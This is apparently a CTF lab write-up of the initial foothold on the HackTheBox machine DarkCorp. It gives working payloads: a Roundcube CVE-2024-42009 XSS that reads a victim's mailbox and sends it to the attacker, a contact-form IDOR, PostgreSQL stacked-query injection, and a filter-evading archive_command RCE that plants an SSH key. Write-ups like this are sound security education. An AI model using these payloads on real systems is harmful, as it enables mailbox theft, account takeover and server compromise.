## Overview

DarkCorp is an Insane Windows box, but the entry point is a Linux (Debian) mail and web server hosting a custom "DripMail" app over Roundcube. The path to the first shell chains four web bugs: a Roundcube stored-XSS desanitization flaw (CVE-2024-42009), a recipient IDOR on the contact form, a PostgreSQL injection in a hidden analytics dashboard, and a superuser-to-RCE technique that survives a query filter. This post stops at that initial foothold.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH 9.2p1 (Debian) |
| 80   | nginx 1.22.1 → redirects to `drip.htb` |

Only two ports. Port 80 redirects to `drip.htb`, and two virtual hosts matter — `mail.drip.htb` (Roundcube) and `dev-a3f1-01.drip.htb` (a 403'd "DripMail Dashboard"). Everything works over `Host:` headers against the IP, so no DNS edits are strictly required.

```bash
nmap -sC -sV <ip>
curl -s -H 'Host: mail.drip.htb' http://<ip>/ | grep -oE 'rcversion":[0-9]+'   # 10607 = 1.6.7
```

## Enumeration

`mail.drip.htb` is Roundcube **1.6.7** — vulnerable to CVE-2024-42009 (patched in 1.6.8). Registering an account on `drip.htb` (the signup form needs its `register=` submit field) gives a working Roundcube login. The contact form POSTs to `/contact` with a hidden `recipient` field the client can change — a textbook IDOR. `dev-a3f1-01.drip.htb` is a separate dashboard that 403s without auth but exposes a `/forgot` password-reset endpoint.

## Foothold

**1 — Steal the admin's inbox with CVE-2024-42009.** Roundcube strips the `bgcolor` attribute with a context-blind regex; nesting it inside another attribute reforms a live `onanimationstart` handler that fires when the mail is *viewed*. Because Roundcube cookies are HttpOnly, the payload instead uses the same-origin mail API to read the victim's inbox and exfiltrate it. Set `content=html` and `recipient=bcase@drip.htb` (the admin bot), and request a dashboard password reset for `bcase` first so the reset link is sitting in his inbox to be stolen.

```bash
# body payload (URL-encoded into message=):
# <body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('<b64 loader>')) foo=bar">Foo</body>
curl -s -H 'Host: dev-a3f1-01.drip.htb' --data-urlencode email=bcase@drip.htb --data-urlencode csrf_token=<csrf> --data-urlencode reset_form= http://<ip>/forgot
curl -s -H 'Host: drip.htb' --data-urlencode 'message=<payload>' --data-urlencode content=html --data-urlencode recipient=bcase@drip.htb --data-urlencode name=x --data-urlencode email=x@drip.htb http://<ip>/contact
```

The admin bot views the message and beacons the inbox to your listener — including the reset link. Use it to set `bcase`'s dashboard password and log in.

**2 — PostgreSQL injection in the dashboard search.** The `/analytics` search builds `SELECT * FROM "Users" WHERE "Users".username = <input>` with no quoting, and renders the *last* result set of a stacked query — so you read arbitrary output directly.

![analytics SQLi superuser](/assets/Images/darkcorp-004_enum_sqli-superuser.png)

```sql
'0xdf'; SELECT current_setting('is_superuser');-- -   -- returns "on"
```

**3 — Superuser → RCE via archive_command.** `COPY ... TO PROGRAM` and `ALTER SYSTEM` are both parser-blocked here, but the large-object functions are plain `SELECT` calls that slip past the filter. `archive_mode` is already `on`, so writing a new `archive_command` into `postgresql.auto.conf` and forcing a WAL switch runs your command as the `postgres` OS user — here, dropping an SSH key.

```sql
'0xdf'; SELECT lo_from_bytea(31337, decode('<b64 auto.conf>','base64'));
SELECT lo_export(31337,'/var/lib/postgresql/15/main/postgresql.auto.conf');
SELECT lo_unlink(31337); SELECT pg_reload_conf();-- -
'0xdf'; SELECT pg_switch_wal();-- -
```

```bash
ssh -i dc_key postgres@<ip>   # uid=102(postgres) on drip
```

![postgres shell on DRIP](/assets/Images/darkcorp-001_foothold_postgres-rce.png)

## Initial access

```bash
id   # uid=102(postgres) gid=110(postgres) — shell on the DRIP host
```

A foothold on the Debian front end is achieved as `postgres`. From here DarkCorp opens into its internal Active Directory network (DC-01 / WEB-01) — credential recovery, NTLM/Kerberos relay, and GPO abuse.

> Foothold complete. The Active Directory chain — lateral movement, privilege escalation, and root — is left as an exercise; this post stops at the initial shell.
